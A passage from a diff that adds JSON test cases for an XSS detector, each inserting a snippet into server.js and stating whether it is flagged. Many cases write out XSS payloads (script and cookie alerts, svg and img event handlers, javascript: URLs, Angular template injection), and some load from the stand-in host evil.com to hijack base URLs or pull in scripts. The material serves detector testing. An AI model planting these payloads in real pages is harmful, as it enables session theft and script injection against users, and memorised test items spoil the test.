+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "jQuery .html() sets innerHTML from input"
+  },
+  {
+    "id": "xss-094",
+    "requiresDocker": false,
+    "description": "XSS-07 clean: textContent assignment",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: document.getElementById(\"app\").textContent = \"Hello\"\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "textContent is a safe DOM property (no HTML parsing)"
+  },
+  {
+    "id": "xss-095",
+    "requiresDocker": false,
+    "description": "XSS-07 clean: setTimeout with arrow function",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: setTimeout(() => { console.log(\"done\"); }, 0)\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "Arrow function callback, not string argument"
+  },
+  {
+    "id": "xss-096",
+    "requiresDocker": false,
+    "description": "XSS-07 grounding: fabricated document.write in server.js",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "content",
+        "file": "server.js",
+        "pattern": "document\\.write\\("
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "No document.write calls exist in server.js (it is server-side Node.js)"
+  },
+  {
+    "id": "xss-097",
+    "requiresDocker": false,
+    "description": "XSS-07 grounding: fabricated innerHTML sink in /about route",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "content",
+        "file": "server.js",
+        "pattern": "\\.innerHTML\\s*="
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "No innerHTML assignments exist in server.js"
+  },
+  {
+    "id": "xss-098",
+    "requiresDocker": false,
+    "description": "XSS-08: stored script in form field echo",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const userName = '<script>alert(document.cookie)</script>';\n    res.end('<html><body>Welcome ' + userName + '</body></html>');\n    return;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "stored_xss",
+      "XSS-08"
+    ],
+    "rationale": "User-supplied name containing script tag echoed without sanitization"
+  },
+  {
+    "id": "xss-099",
+    "requiresDocker": false,
+    "description": "XSS-08: stored img onerror in comment field",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const comment = '<img src=x onerror=alert(1)>';\n    res.end('<html><body><div class=\"comment\">' + comment + '</div></body></html>');\n    return;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "stored_xss",
+      "XSS-08"
+    ],
+    "rationale": "Stored XSS via img onerror in comment display"
+  },
+  {
+    "id": "xss-100",
+    "requiresDocker": false,
+    "description": "XSS-08: stored SVG onload in profile bio",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const bio = '<svg onload=alert(1)>';\n    res.end('<html><body><p>' + bio + '</p></body></html>');\n    return;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "stored_xss",
+      "XSS-08"
+    ],
+    "rationale": "Stored XSS via SVG onload in profile bio rendering"
+  },
+  {
+    "id": "xss-101",
+    "requiresDocker": false,
+    "description": "XSS-08 clean: echo endpoint returns JSON (not HTML)",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "stored_xss",
+      "XSS-08"
+    ],
+    "rationale": "The /api/echo endpoint returns JSON, not rendered HTML"
+  },
+  {
+    "id": "xss-102",
+    "requiresDocker": false,
+    "description": "XSS-08 clean: HTML-escaped user output",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const safe = userInput.replace(/</g, \"&lt;\").replace(/>/g, \"&gt;\");\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "stored_xss",
+      "XSS-08"
+    ],
+    "rationale": "HTML entity escaping prevents stored XSS"
+  },
+  {
+    "id": "xss-103",
+    "requiresDocker": false,
+    "description": "XSS-08 grounding: fabricated unescaped user display in /form route",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "content",
+        "file": "server.js",
+        "pattern": "\\+ req\\.body\\.name \\+"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "stored_xss",
+      "XSS-08"
+    ],
+    "rationale": "The /form route does not concatenate req.body into HTML"
+  },
+  {
+    "id": "xss-104",
+    "requiresDocker": false,
+    "description": "XSS-09: base tag hijack to external domain",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<base href=\"https://evil.com/\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "csp_bypass",
+      "XSS-09"
+    ],
+    "rationale": "Base tag hijacks all relative URLs to attacker domain"
+  },
+  {
+    "id": "xss-105",
+    "requiresDocker": false,
+    "description": "XSS-09: script with fake nonce attribute",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script nonce='bypass'>alert(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "csp_bypass",
+      "XSS-09"
+    ],
+    "rationale": "Script tag with fabricated nonce attribute"
+  },
+  {
+    "id": "xss-106",
+    "requiresDocker": false,
+    "description": "XSS-09: JSONP callback injection pattern",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script src=\"https://api.example.com/data?callback=alert\"></script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "csp_bypass",
+      "XSS-09"
+    ],
+    "rationale": "JSONP endpoint with attacker-controlled callback name"
+  },
+  {
+    "id": "xss-107",
+    "requiresDocker": false,
+    "description": "XSS-09: link preload to inject script",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<link rel=\"preload\" href=\"https://evil.com/payload.js\" as=\"script\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "csp_bypass",
+      "XSS-09"
+    ],
+    "rationale": "Preload link to external script resource"
+  },
+  {
+    "id": "xss-108",
+    "requiresDocker": false,
+    "description": "XSS-09: style import for CSS exfiltration",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<style>@import url(\"https://evil.com/steal.css\");</style>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "csp_bypass",
+      "XSS-09"
+    ],
+    "rationale": "CSS @import from external domain for data exfiltration"
+  },
+  {
+    "id": "xss-109",
+    "requiresDocker": false,
+    "description": "XSS-09 clean: base tag with same-origin root",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const base = \"<base href=\\\"/\\\">\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "csp_bypass",
+      "XSS-09"
+    ],
+    "rationale": "Base tag with same-origin root is safe"
+  },
+  {
+    "id": "xss-110",
+    "requiresDocker": false,
+    "description": "XSS-09 grounding: fabricated CSP header bypass in server.js",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "content",
+        "file": "server.js",
+        "pattern": "Content-Security-Policy.*unsafe-inline"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "csp_bypass",
+      "XSS-09"
+    ],
+    "rationale": "server.js does not set any CSP headers"
+  },
+  {
+    "id": "xss-111",
+    "requiresDocker": false,
+    "description": "XSS-10: Angular expression injection {{constructor.constructor(\"alert(1)\")()}}",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `{{constructor.constructor(\"alert(1)\")()}}`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "framework_specific",
+      "XSS-10"
+    ],
+    "rationale": "Angular template expression injection via constructor chain"
+  },
+  {
+    "id": "xss-112",
+    "requiresDocker": false,
+    "description": "XSS-10: Angular ng-bind-html without sanitize",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<div ng-bind-html=\"userInput\"></div>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "framework_specific",
+      "XSS-10"
+    ],
+    "rationale": "Angular ng-bind-html with unsanitized user input"
+  },
+  {
+    "id": "xss-113",
+    "requiresDocker": false,
+    "description": "XSS-10: React dangerouslySetInnerHTML with user input",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: React.createElement(\"div\", { dangerouslySetInnerHTML: { __html: userInput } })\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "framework_specific",
+      "XSS-10"
+    ],
+    "rationale": "dangerouslySetInnerHTML with unvalidated user input"
+  },
+  {
+    "id": "xss-114",
+    "requiresDocker": false,
+    "description": "XSS-10: Vue v-html directive with user input",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<div v-html=\"userInput\"></div>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "framework_specific",
+      "XSS-10"
+    ],
+    "rationale": "Vue v-html renders raw HTML from user input"
+  },
+  {
+    "id": "xss-115",
+    "requiresDocker": false,
+    "description": "XSS-10: Angular $sce.trustAsHtml with input",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: $sce.trustAsHtml(userInput)\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "framework_specific",
+      "XSS-10"
+    ],
+    "rationale": "$sce.trustAsHtml bypasses Angular sanitization"
+  },
+  {
+    "id": "xss-116",
+    "requiresDocker": false,
+    "description": "XSS-10: jQuery .append() with unsanitized input",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: $(selector).append(userInput)\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "framework_specific",
+      "XSS-10"
+    ],
+    "rationale": "jQuery .append() with raw user input"
+  },
+  {
+    "id": "xss-117",
+    "requiresDocker": false,
+    "description": "XSS-10 clean: React createElement with text children only",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const el = \"React.createElement(\\\"div\\\", null, userInput);\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "framework_specific",
+      "XSS-10"
+    ],
+    "rationale": "React text children are auto-escaped"
+  },
+  {
+    "id": "xss-118",
+    "requiresDocker": false,
+    "description": "XSS-10 clean: Vue v-text directive",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const el = \"<div v-text=\\\"userInput\\\"></div>\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "framework_specific",
+      "XSS-10"
+    ],
+    "rationale": "Vue v-text auto-escapes (unlike v-html)"
+  },
+  {
+    "id": "xss-119",
+    "requiresDocker": false,
+    "description": "XSS-10 grounding: fabricated Angular expression in demo-app",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "content",
+        "file": "server.js",
+        "pattern": "ng-bind-html"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "framework_specific",
+      "XSS-10"
+    ],
+    "rationale": "Demo app is vanilla Node.js with no Angular framework"
+  },
+  {
+    "id": "xss-120",
+    "requiresDocker": false,
+    "description": "XSS-10 grounding: fabricated dangerouslySetInnerHTML in server.js",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "content",
+        "file": "server.js",
+        "pattern": "dangerouslySetInnerHTML"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "framework_specific",
+      "XSS-10"
+    ],
+    "rationale": "Demo app has no React; dangerouslySetInnerHTML does not exist"
+  },
+  {
+    "id": "xss-121",
+    "requiresDocker": false,
+    "description": "XSS-11: svg onload handler",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg onload=alert(1)>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "SVG element with onload event handler"
+  },
+  {
+    "id": "xss-122",
+    "requiresDocker": false,
+    "description": "XSS-11: svg onload with document.domain",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg onload=alert(document.domain)>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "SVG onload exfiltrating document.domain"
+  },
+  {
+    "id": "xss-123",
+    "requiresDocker": false,
+    "description": "XSS-11: svg script tag inside SVG namespace",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg><script>alert(1)</script></svg>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "Script tag within SVG namespace"
+  },
+  {
+    "id": "xss-124",
+    "requiresDocker": false,
+    "description": "XSS-11: svg foreignObject with body onload",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg><foreignObject><body onload=alert(1)></foreignObject></svg>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "foreignObject allowing HTML body with onload"
+  },
+  {
+    "id": "xss-125",
+    "requiresDocker": false,
+    "description": "XSS-11: svg animate href to javascript",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg><animate attributeName=\"href\" values=\"javascript:alert(1)\"/></svg>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "SVG animate changing href to javascript: URL"
+  },
+  {
+    "id": "xss-126",
+    "requiresDocker": false,
+    "description": "XSS-11: svg set attributeName href to javascript",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg><set attributeName=\"href\" to=\"javascript:alert(1)\"/></svg>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "SVG set element changing href to javascript:"
+  },
+  {
+    "id": "xss-127",
+    "requiresDocker": false,
+    "description": "XSS-11: svg a xlink:href javascript protocol",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg><a xlink:href=\"javascript:alert(1)\"><text>click</text></a></svg>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "SVG anchor with xlink:href javascript: protocol"
+  },
+  {
+    "id": "xss-128",
+    "requiresDocker": false,
+    "description": "XSS-11: svg use xlink:href data URI with onload",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg><use xlink:href=\"data:image/svg+xml,<svg onload=alert(1)>\"></use></svg>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "SVG use element loading external SVG with onload"
+  },
+  {
+    "id": "xss-129",
+    "requiresDocker": false,
+    "description": "XSS-11: svg image xlink:href javascript",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg><image xlink:href=\"javascript:alert(1)\"></image></svg>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "SVG image with xlink:href javascript: protocol"
+  },
+  {
+    "id": "xss-130",
+    "requiresDocker": false,
+    "description": "XSS-11: svg onload in nested g element",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg><g onload=alert(1)><rect width=100 height=100></g></svg>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "Onload handler on SVG g (group) element"
+  },
+  {
+    "id": "xss-131",
+    "requiresDocker": false,
+    "description": "XSS-11: svg desc with embedded script",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg><desc><script>alert(1)</script></desc></svg>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "Script tag inside SVG desc element"
+  },
+  {
+    "id": "xss-132",
+    "requiresDocker": false,
+    "description": "XSS-11: svg feImage with javascript xlink",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg><filter><feImage xlink:href=\"javascript:alert(1)\"></feImage></filter></svg>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "SVG filter feImage with javascript: URL"
+  },
+  {
+    "id": "xss-133",
+    "requiresDocker": false,
+    "description": "XSS-11: MathML mi xlink:href javascript",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<math><mi xlink:href=\"javascript:alert(1)\">click</mi></math>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "MathML element with xlink:href javascript:"
+  },
+  {
+    "id": "xss-134",
+    "requiresDocker": false,
+    "description": "XSS-11 clean: svg with viewBox and rect only",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const svg = \"<svg viewBox=\\\"0 0 100 100\\\"><rect fill=\\\"blue\\\"/></svg>\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "SVG with simple rect element, no event handlers"
+  },
+  {
+    "id": "xss-135",
+    "requiresDocker": false,
+    "description": "XSS-11 clean: svg with safe animate opacity",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const svg = \"<svg><animate attributeName=\\\"opacity\\\" values=\\\"0;1\\\"/></svg>\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "SVG animate with safe opacity animation values"
+  },
+  {
+    "id": "xss-136",
+    "requiresDocker": false,
+    "description": "XSS-11 grounding: fabricated SVG foreignObject in demo-app",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "html",
+        "selector": "svg foreignObject",
+        "expected": "exists"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "svg_based",
+      "XSS-11"
+    ],
+    "rationale": "No SVG foreignObject element exists in any demo-app route"
+  },
+  {
+    "id": "xss-137",
+    "requiresDocker": false,
+    "description": "XSS-12: noscript tag trick with img onerror",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<noscript><img src=x onerror=alert(1)></noscript>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "Noscript content parsed differently in innerHTML context"
+  },
+  {
+    "id": "xss-138",
+    "requiresDocker": false,
+    "description": "XSS-12: style tag with closing trick",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<style></style><script>alert(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "Style tag closing followed by script injection"
+  },
+  {
+    "id": "xss-139",
+    "requiresDocker": false,
+    "description": "XSS-12: table parser quirk with form injection",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<table><tr><td><form action=\"javascript:alert(1)\"><button>X</button></form></td></tr></table>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "Form with javascript: action inside table (parser quirk)"
+  },
+  {
+    "id": "xss-140",
+    "requiresDocker": false,
